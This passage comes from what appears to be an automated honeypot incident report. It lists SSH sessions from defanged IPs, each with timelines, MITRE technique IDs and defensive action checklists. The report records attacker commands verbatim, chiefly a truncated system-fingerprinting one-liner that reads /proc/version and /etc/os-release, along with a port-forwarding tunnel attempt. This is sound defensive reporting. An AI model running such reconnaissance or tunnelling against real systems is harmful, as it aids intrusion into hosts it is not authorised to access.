| `2026-07-06 13:59:56` | `cowrie.login.success` |
| `2026-07-06 14:00:05` | `cowrie.session.params` |
| `2026-07-06 14:00:05` | `cowrie.command.input` |
| `2026-07-06 14:00:05` | `cowrie.command.input` |
| `2026-07-06 14:00:05` | `cowrie.command.input` |
| `2026-07-06 14:00:05` | `cowrie.command.input` |
| `2026-07-06 14:00:05` | `cowrie.command.input` |
| `2026-07-06 14:00:05` | `cowrie.command.success` |
| `2026-07-06 14:00:05` | `cowrie.command.input` |
| `2026-07-06 14:00:05` | `cowrie.command.input` |
| `2026-07-06 14:00:05` | `cowrie.command.input` |
| `2026-07-06 14:00:05` | `cowrie.command.input` |
| `2026-07-06 14:00:10` | `cowrie.log.closed` |
| `2026-07-06 14:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6c89ba1eb6e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:59 |
| **Last Seen** | 2026-07-06 13:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:59:53` | `cowrie.session.connect` |
| `2026-07-06 13:59:53` | `cowrie.client.version` |
| `2026-07-06 13:59:53` | `cowrie.client.kex` |
| `2026-07-06 13:59:56` | `cowrie.login.success` |
| `2026-07-06 13:59:58` | `cowrie.session.params` |
| `2026-07-06 13:59:58` | `cowrie.command.input` |
| `2026-07-06 13:59:58` | `cowrie.command.input` |
| `2026-07-06 13:59:58` | `cowrie.command.input` |
| `2026-07-06 13:59:58` | `cowrie.command.input` |
| `2026-07-06 13:59:58` | `cowrie.command.input` |
| `2026-07-06 13:59:58` | `cowrie.command.success` |
| `2026-07-06 13:59:58` | `cowrie.command.input` |
| `2026-07-06 13:59:58` | `cowrie.command.input` |
| `2026-07-06 13:59:58` | `cowrie.command.input` |
| `2026-07-06 13:59:58` | `cowrie.command.input` |
| `2026-07-06 13:59:58` | `cowrie.log.closed` |
| `2026-07-06 13:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b9cf956ee62

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 13:59 |
| **Last Seen** | 2026-07-06 14:00 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:59:58` | `cowrie.session.connect` |
| `2026-07-06 13:59:59` | `cowrie.client.version` |
| `2026-07-06 13:59:59` | `cowrie.client.kex` |
| `2026-07-06 14:00:06` | `cowrie.login.success` |
| `2026-07-06 14:00:09` | `cowrie.session.params` |
| `2026-07-06 14:00:09` | `cowrie.command.input` |
| `2026-07-06 14:00:11` | `cowrie.log.closed` |
| `2026-07-06 14:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af3b6c6e716f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 14:00 |
| **Last Seen** | 2026-07-06 14:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:00:10` | `cowrie.session.connect` |
| `2026-07-06 14:00:10` | `cowrie.client.version` |
| `2026-07-06 14:00:10` | `cowrie.client.kex` |
| `2026-07-06 14:00:10` | `cowrie.login.success` |
| `2026-07-06 14:00:11` | `cowrie.session.params` |
| `2026-07-06 14:00:11` | `cowrie.command.input` |
| `2026-07-06 14:00:11` | `cowrie.log.closed` |
| `2026-07-06 14:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96eba2ab9328

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:01 |
| **Last Seen** | 2026-07-06 14:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:01:14` | `cowrie.session.connect` |
| `2026-07-06 14:01:14` | `cowrie.client.version` |
| `2026-07-06 14:01:14` | `cowrie.client.kex` |
| `2026-07-06 14:01:16` | `cowrie.login.success` |
| `2026-07-06 14:01:18` | `cowrie.session.params` |
| `2026-07-06 14:01:18` | `cowrie.command.input` |
| `2026-07-06 14:01:18` | `cowrie.command.input` |
| `2026-07-06 14:01:18` | `cowrie.command.input` |
| `2026-07-06 14:01:18` | `cowrie.command.input` |
| `2026-07-06 14:01:18` | `cowrie.command.input` |
| `2026-07-06 14:01:18` | `cowrie.command.success` |
| `2026-07-06 14:01:18` | `cowrie.command.input` |
| `2026-07-06 14:01:18` | `cowrie.command.input` |
| `2026-07-06 14:01:18` | `cowrie.command.input` |
| `2026-07-06 14:01:18` | `cowrie.command.input` |
| `2026-07-06 14:01:19` | `cowrie.log.closed` |
| `2026-07-06 14:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31cf8010e97a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:01 |
| **Last Seen** | 2026-07-06 14:02 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:01:26` | `cowrie.session.connect` |
| `2026-07-06 14:01:29` | `cowrie.client.version` |
| `2026-07-06 14:01:29` | `cowrie.client.kex` |
| `2026-07-06 14:01:51` | `cowrie.login.success` |
| `2026-07-06 14:02:03` | `cowrie.session.params` |
| `2026-07-06 14:02:03` | `cowrie.command.input` |
| `2026-07-06 14:02:03` | `cowrie.command.input` |
| `2026-07-06 14:02:03` | `cowrie.command.input` |
| `2026-07-06 14:02:03` | `cowrie.command.input` |
| `2026-07-06 14:02:03` | `cowrie.command.input` |
| `2026-07-06 14:02:03` | `cowrie.command.success` |
| `2026-07-06 14:02:03` | `cowrie.command.input` |
| `2026-07-06 14:02:03` | `cowrie.command.input` |
| `2026-07-06 14:02:03` | `cowrie.command.input` |
| `2026-07-06 14:02:03` | `cowrie.command.input` |
| `2026-07-06 14:02:08` | `cowrie.log.closed` |
| `2026-07-06 14:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea18d8983f95

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 14:01 |
| **Last Seen** | 2026-07-06 14:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:01:38` | `cowrie.session.connect` |
| `2026-07-06 14:01:38` | `cowrie.client.version` |
| `2026-07-06 14:01:38` | `cowrie.client.kex` |
| `2026-07-06 14:01:39` | `cowrie.login.success` |
| `2026-07-06 14:01:39` | `cowrie.direct-tcpip.request` |
| `2026-07-06 14:01:39` | `cowrie.direct-tcpip.data` |
| `2026-07-06 14:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d9a09e71038

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:02 |
| **Last Seen** | 2026-07-06 14:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:02:35` | `cowrie.session.connect` |
| `2026-07-06 14:02:35` | `cowrie.client.version` |
| `2026-07-06 14:02:35` | `cowrie.client.kex` |
| `2026-07-06 14:02:37` | `cowrie.login.success` |
| `2026-07-06 14:02:39` | `cowrie.session.params` |
| `2026-07-06 14:02:39` | `cowrie.command.input` |
| `2026-07-06 14:02:39` | `cowrie.command.input` |
| `2026-07-06 14:02:39` | `cowrie.command.input` |
| `2026-07-06 14:02:39` | `cowrie.command.input` |
| `2026-07-06 14:02:39` | `cowrie.command.input` |
| `2026-07-06 14:02:39` | `cowrie.command.success` |
| `2026-07-06 14:02:39` | `cowrie.command.input` |
| `2026-07-06 14:02:39` | `cowrie.command.input` |
| `2026-07-06 14:02:39` | `cowrie.command.input` |
| `2026-07-06 14:02:39` | `cowrie.command.input` |
| `2026-07-06 14:02:40` | `cowrie.log.closed` |
| `2026-07-06 14:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470ef8b4a359

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:03 |
| **Last Seen** | 2026-07-06 14:04 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:03:29` | `cowrie.session.connect` |
| `2026-07-06 14:03:35` | `cowrie.client.version` |
| `2026-07-06 14:03:35` | `cowrie.client.kex` |
| `2026-07-06 14:03:56` | `cowrie.login.success` |
| `2026-07-06 14:04:06` | `cowrie.session.params` |
| `2026-07-06 14:04:06` | `cowrie.command.input` |
| `2026-07-06 14:04:06` | `cowrie.command.input` |
| `2026-07-06 14:04:06` | `cowrie.command.input` |
| `2026-07-06 14:04:06` | `cowrie.command.input` |
| `2026-07-06 14:04:06` | `cowrie.command.input` |
| `2026-07-06 14:04:06` | `cowrie.command.success` |
| `2026-07-06 14:04:06` | `cowrie.command.input` |
| `2026-07-06 14:04:06` | `cowrie.command.input` |
| `2026-07-06 14:04:06` | `cowrie.command.input` |
| `2026-07-06 14:04:06` | `cowrie.command.input` |
| `2026-07-06 14:04:10` | `cowrie.log.closed` |
| `2026-07-06 14:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb503f9f5842

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:03 |
| **Last Seen** | 2026-07-06 14:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:03:55` | `cowrie.session.connect` |
| `2026-07-06 14:03:55` | `cowrie.client.version` |
| `2026-07-06 14:03:55` | `cowrie.client.kex` |
| `2026-07-06 14:03:57` | `cowrie.login.success` |
| `2026-07-06 14:03:59` | `cowrie.session.params` |
| `2026-07-06 14:03:59` | `cowrie.command.input` |
| `2026-07-06 14:03:59` | `cowrie.command.input` |
| `2026-07-06 14:03:59` | `cowrie.command.input` |
| `2026-07-06 14:03:59` | `cowrie.command.input` |
| `2026-07-06 14:03:59` | `cowrie.command.input` |
| `2026-07-06 14:03:59` | `cowrie.command.success` |
| `2026-07-06 14:03:59` | `cowrie.command.input` |
| `2026-07-06 14:03:59` | `cowrie.command.input` |
| `2026-07-06 14:03:59` | `cowrie.command.input` |
| `2026-07-06 14:03:59` | `cowrie.command.input` |
| `2026-07-06 14:04:01` | `cowrie.log.closed` |
| `2026-07-06 14:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07888b033aa2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:05 |
| **Last Seen** | 2026-07-06 14:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:05:14` | `cowrie.session.connect` |
| `2026-07-06 14:05:14` | `cowrie.client.version` |
| `2026-07-06 14:05:14` | `cowrie.client.kex` |
| `2026-07-06 14:05:17` | `cowrie.login.success` |
| `2026-07-06 14:05:18` | `cowrie.session.params` |
| `2026-07-06 14:05:18` | `cowrie.command.input` |
| `2026-07-06 14:05:18` | `cowrie.command.input` |
| `2026-07-06 14:05:18` | `cowrie.command.input` |
| `2026-07-06 14:05:18` | `cowrie.command.input` |
| `2026-07-06 14:05:18` | `cowrie.command.input` |
| `2026-07-06 14:05:18` | `cowrie.command.success` |
| `2026-07-06 14:05:18` | `cowrie.command.input` |
| `2026-07-06 14:05:18` | `cowrie.command.input` |
| `2026-07-06 14:05:18` | `cowrie.command.input` |
| `2026-07-06 14:05:18` | `cowrie.command.input` |
| `2026-07-06 14:05:19` | `cowrie.log.closed` |
| `2026-07-06 14:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-154b414b0255

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:05 |
| **Last Seen** | 2026-07-06 14:06 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:05:31` | `cowrie.session.connect` |
| `2026-07-06 14:05:35` | `cowrie.client.version` |
| `2026-07-06 14:05:35` | `cowrie.client.kex` |
| `2026-07-06 14:05:56` | `cowrie.login.success` |
| `2026-07-06 14:06:05` | `cowrie.session.params` |
| `2026-07-06 14:06:05` | `cowrie.command.input` |
| `2026-07-06 14:06:05` | `cowrie.command.input` |
| `2026-07-06 14:06:05` | `cowrie.command.input` |
| `2026-07-06 14:06:05` | `cowrie.command.input` |
| `2026-07-06 14:06:05` | `cowrie.command.input` |
| `2026-07-06 14:06:05` | `cowrie.command.success` |
| `2026-07-06 14:06:05` | `cowrie.command.input` |
| `2026-07-06 14:06:05` | `cowrie.command.input` |
| `2026-07-06 14:06:05` | `cowrie.command.input` |
| `2026-07-06 14:06:05` | `cowrie.command.input` |
| `2026-07-06 14:06:09` | `cowrie.log.closed` |
| `2026-07-06 14:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14579881afd7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:06 |
| **Last Seen** | 2026-07-06 14:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:06:33` | `cowrie.session.connect` |
| `2026-07-06 14:06:33` | `cowrie.client.version` |
| `2026-07-06 14:06:33` | `cowrie.client.kex` |
| `2026-07-06 14:06:36` | `cowrie.login.success` |
| `2026-07-06 14:06:37` | `cowrie.session.params` |
| `2026-07-06 14:06:37` | `cowrie.command.input` |
| `2026-07-06 14:06:37` | `cowrie.command.input` |
| `2026-07-06 14:06:37` | `cowrie.command.input` |
| `2026-07-06 14:06:37` | `cowrie.command.input` |
| `2026-07-06 14:06:37` | `cowrie.command.input` |
| `2026-07-06 14:06:37` | `cowrie.command.success` |
| `2026-07-06 14:06:37` | `cowrie.command.input` |
| `2026-07-06 14:06:37` | `cowrie.command.input` |
| `2026-07-06 14:06:38` | `cowrie.command.input` |
| `2026-07-06 14:06:38` | `cowrie.command.input` |
| `2026-07-06 14:06:38` | `cowrie.log.closed` |
| `2026-07-06 14:06:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1b4b6b40f23

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:07 |
| **Last Seen** | 2026-07-06 14:08 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:07:30` | `cowrie.session.connect` |
| `2026-07-06 14:07:34` | `cowrie.client.version` |
| `2026-07-06 14:07:34` | `cowrie.client.kex` |
| `2026-07-06 14:07:53` | `cowrie.login.success` |
| `2026-07-06 14:08:03` | `cowrie.session.params` |
| `2026-07-06 14:08:03` | `cowrie.command.input` |
| `2026-07-06 14:08:03` | `cowrie.command.input` |
| `2026-07-06 14:08:03` | `cowrie.command.input` |
| `2026-07-06 14:08:03` | `cowrie.command.input` |
| `2026-07-06 14:08:03` | `cowrie.command.input` |
| `2026-07-06 14:08:03` | `cowrie.command.success` |
| `2026-07-06 14:08:03` | `cowrie.command.input` |
| `2026-07-06 14:08:03` | `cowrie.command.input` |
| `2026-07-06 14:08:03` | `cowrie.command.input` |
| `2026-07-06 14:08:03` | `cowrie.command.input` |
| `2026-07-06 14:08:07` | `cowrie.log.closed` |
| `2026-07-06 14:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bbf15db6ae1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:07 |
| **Last Seen** | 2026-07-06 14:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
